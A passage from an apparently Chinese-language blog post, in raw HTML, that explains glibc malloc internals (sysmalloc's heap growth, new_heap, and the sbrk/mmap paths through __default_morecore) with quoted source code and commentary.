&amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//直接向top chunk高地址处扩展内存成功</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">            heap-&gt;ar_ptr = av;</span><br><span class="line">            heap-&gt;prev = old_heap;</span><br><span class="line">            av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">            arena_mem += heap-&gt;size;</span><br><span class="line">            <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">            top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">            set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">             MALLOC_ALIGNMENT in size. */</span></span><br><span class="line">            <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">             become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">             up, too, although the chunk is marked in use. */</span></span><br><span class="line">            old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">            set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">            <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">                set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">                set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">                _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                set_head (old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                set_foot (old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">            <span class="comment">/* We can at least try to use to mmap memory.  */</span></span><br><span class="line">            <span class="keyword">goto</span> try_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接扩展内存失败，则调用<code>new_heap</code>函数重新申请一块<code>heap</code>内存。(大部分情况下扩展内存失败的原因是因为该<code>heap</code>的大小已经达到<code>HEAP_MAX_SIZE</code>了)。</p><h3 id="new-heap"><a href="#new-heap" class="headerlink" title="new_heap"></a>new_heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Create a new heap.  size is automatically rounded up to a multiple</span></span><br><span class="line"><span class="comment">   of the page size. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> heap_info *</span><br><span class="line">internal_function</span><br><span class="line"><span class="title function_">new_heap</span> <span class="params">(<span class="type">size_t</span> size, <span class="type">size_t</span> top_pad)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ul;</span><br><span class="line">    heap_info *h;</span><br><span class="line">    <span class="comment">//对size进行调整</span></span><br><span class="line">    <span class="keyword">if</span> (size + top_pad &lt; HEAP_MIN_SIZE)</span><br><span class="line">        size = HEAP_MIN_SIZE;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (size + top_pad &lt;= HEAP_MAX_SIZE)</span><br><span class="line">        size += top_pad;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (size &gt; HEAP_MAX_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        size = HEAP_MAX_SIZE;</span><br><span class="line">    size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.</span></span><br><span class="line"><span class="comment">     No swap space needs to be reserved for the following large</span></span><br><span class="line"><span class="comment">     mapping (on Linux, this is the case for all non-writable mappings</span></span><br><span class="line"><span class="comment">     anyway). */</span></span><br><span class="line">    p2 = MAP_FAILED;</span><br><span class="line">    <span class="keyword">if</span> (aligned_heap_area)</span><br><span class="line">    &#123;</span><br><span class="line">        p2 = (<span class="type">char</span> *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,</span><br><span class="line">                            MAP_NORESERVE);</span><br><span class="line">        aligned_heap_area = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (p2 != MAP_FAILED &amp;&amp; ((<span class="type">unsigned</span> <span class="type">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">            p2 = MAP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        p1 = (<span class="type">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE &lt;&lt; <span class="number">1</span>, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">        <span class="keyword">if</span> (p1 != MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            p2 = (<span class="type">char</span> *) (((<span class="type">unsigned</span> <span class="type">long</span>) p1 + (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">                           &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>));</span><br><span class="line">            ul = p2 - p1;</span><br><span class="line">            <span class="keyword">if</span> (ul)</span><br><span class="line">                __munmap (p1, ul);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                aligned_heap_area = p2 + HEAP_MAX_SIZE;</span><br><span class="line">            __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Try to take the chance that an allocation of only HEAP_MAX_SIZE</span></span><br><span class="line"><span class="comment">             is already aligned. */</span></span><br><span class="line">            p2 = (<span class="type">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">            <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (__mprotect (p2, size, PROT_READ | PROT_WRITE) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    h = (heap_info *) p2;</span><br><span class="line">    h-&gt;size = size;</span><br><span class="line">    h-&gt;mprotect_size = size;</span><br><span class="line">    LIBC_PROBE (memory_heap_new, <span class="number">2</span>, h, h-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先函数对<code>size</code>进行了调整（页大小对齐），注意这里的<code>top pad</code>是需要多分配的内存的大小。<code>aligned_heap_area</code>是上一次调用<code>mmap</code>分配结束之后的地址</p><ul><li>如果<code>aligned_heap_area</code>存在那么尝试从改地址处分配<code>HEAP_MAX_SIZE</code>大小的内存空间（防止内存碎片化），如果成功，则将<code>aligned_heap_area</code>置为空表示已经分配完成，判断分配的内存空间的大小，如果不合法则释放该内存</li><li>如果分配失败，则申请分配<code>2*HEAP_MAX_SIZE</code>大小的内存空间，起始地址由内核决定。若分配成功则截取<code>HEAP_MAX_SIZE</code>大小的空间，设置<code>aligned_heap_area</code>为高地址处的内存空间。</li><li>如果<code>2*HEAP_MAX_SIZE</code>分配失败，则申请分配<code>HEAP_MAX_SIZE</code>大小的内存空间，如果失败则返回空指针。</li></ul><p>分配成功之后修改新空间所在的内存地址的可读写权限，并更新<code>heap_info</code>结构体中表示内存大小的值。返回新的结构体指针。</p><p>如果分配新的堆块成功，则将该堆加入到本线程的堆链表中，更新<code>malloc_state</code>中表示内存分配数量的值和<code>top chunk</code>指针。接着就会释放之前的<code>top chunk</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">        || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//处理可以使用mmap的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// top chunk 参数和大小检查</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">//处理当前的分配区为非主分配区的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#123; <span class="comment">/* Request enough space for nb + pad + overhead */</span></span><br><span class="line">        size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If contiguous, we can subtract out existing space that we hope to</span></span><br><span class="line"><span class="comment">         combine with new space. We add it back later only if</span></span><br><span class="line"><span class="comment">         we don&#x27;t actually get contiguous space.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">            size -= old_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Round to a multiple of page size.</span></span><br><span class="line"><span class="comment">         If MORECORE is not contiguous, this ensures that we only call it</span></span><br><span class="line"><span class="comment">         with whole-page arguments.  And if MORECORE is contiguous and</span></span><br><span class="line"><span class="comment">         this is not first time through, this preserves page-alignment of</span></span><br><span class="line"><span class="comment">         previous calls. Otherwise, we correct to page-align below.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">        size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Don&#x27;t try to call MORECORE if argument is so big as to appear</span></span><br><span class="line"><span class="comment">         negative. Note that since mmap takes size_t arg, it may succeed</span></span><br><span class="line"><span class="comment">         below even if we cannot call MORECORE.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            brk = (<span class="type">char</span> *) (MORECORE (size));</span><br><span class="line">            LIBC_PROBE (memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">            <span class="type">void</span> (*hook) (<span class="type">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">                (*hook)();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If have mmap, try using it as a backup when MORECORE fails or</span></span><br><span class="line"><span class="comment">             cannot be used. This is worth doing on systems that have &quot;holes&quot; in</span></span><br><span class="line"><span class="comment">             address space, so sbrk cannot extend to give contiguous space, but</span></span><br><span class="line"><span class="comment">             space is available elsewhere.  Note that we ignore mmap max count</span></span><br><span class="line"><span class="comment">             and threshold limits, since the space will not be used as a</span></span><br><span class="line"><span class="comment">             segregated mmap region.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Cannot merge with old top, so add its size back in */</span></span><br><span class="line">            <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">                size = ALIGN_UP (size + old_size, pagesize);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* If we are relying on mmap as backup, then use larger units */</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (MMAP_AS_MORECORE_SIZE))</span><br><span class="line">                size = MMAP_AS_MORECORE_SIZE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">char</span> *mbrk = (<span class="type">char</span> *) (MMAP (<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (mbrk != MAP_FAILED)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* We do not need, and cannot use, another sbrk call to find end */</span></span><br><span class="line">                    brk = mbrk;</span><br><span class="line">                    snd_brk = brk + size;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     Record that we no longer have a contiguous sbrk region.</span></span><br><span class="line"><span class="comment">                     After the first time mmap is used as backup, we do not</span></span><br><span class="line"><span class="comment">                     ever rely on contiguous space since this could incorrectly</span></span><br><span class="line"><span class="comment">                     bridge regions.</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line">                    set_noncontiguous (av);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果当前的分区为主分配区，首先是对传入的<code>size</code>进行了修正。如果分配区是连续的内存的话，就不用重新分配<code>old_size</code>了。接着调用<code>MORECORE</code>进行分配内存。这里的<code>MORECORE</code>是一个宏定义，其默认调用的是<code>__default_morecore</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__default_morecore (<span class="type">ptrdiff_t</span> increment)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *result = (<span class="type">void</span> *) __sbrk (increment);</span><br><span class="line">    <span class="keyword">if</span> (result == (<span class="type">void</span> *) <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__default_morecore)</span><br></pre></td></tr></table></figure><p>可以看出其调用了<a href="#sbrk">__sbrk</a>进行扩展内存，如果调用成功则优先执行<code>after_morecore_hook</code>，否则调用<code>mmap</code>申请内存，并将<code>malloc_state</code>的表示内存空间是否连续的值设为<code>no</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//参数定义</span></span><br><span class="line">    <span class="comment">//处理分配区为空或者可以使用mmap的情况</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">//处理当前的分配区为非主分配区的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//调用MORECORE(sbrk)，并处理调用失败的情况(mmap分配)，若调用成功则优先执行hook</span></span><br><span class="line">        <span class="keyword">if</span> (brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)</span><br><span class="line">                mp_.sbrk_base = brk;</span><br><span class="line">            av-&gt;system_mem += size;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If MORECORE extends previous space, we can likewise extend top size.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">                set_head (old_top, (size + old_size) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span></span><br><span class="line">                malloc_printerr (<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk,</span><br><span class="line">                                 av);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             Otherwise, make adjustments:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * If the first time through or noncontiguous, we need to call sbrk</span></span><br><span class="line"><span class="comment">              just to find out where the end of memory lies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * We need to ensure that all returned chunks from malloc will meet</span></span><br><span class="line"><span class="comment">              MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * If there was an intervening foreign sbrk, we need to adjust sbrk</span></span><br><span class="line"><span class="comment">              request size to account for fact that we will not be able to</span></span><br><span class="line"><span class="comment">              combine new space with existing space in old_top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           * Almost all systems internally allocate whole pages at a time, in</span></span><br><span class="line"><span class="comment">              which case we might as well use the whole last page of request.</span></span><br><span class="line"><span class="comment">              So we allocate enough more memory to hit a page boundary now,</span></span><br><span class="line"><span class="comment">              which in turn causes future contiguous calls to page-align.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                front_misalign = <span class="number">0</span>;</span><br><span class="line">                end_misalign = <span class="number">0</span>;</span><br><span class="line">                correction = <span class="number">0</span>;</span><br><span class="line">                aligned_brk = brk;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* handle contiguous cases */</span></span><br><span class="line">                <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* Count foreign sbrk as system_mem.  */</span></span><br><span class="line">                    <span class="keyword">if</span> (old_size)</span><br><span class="line">                        av-&gt;system_mem += brk - old_end;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Guarantee alignment of first new chunk made from this space */</span></span><br><span class="line"></span><br><span class="line">                    front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; 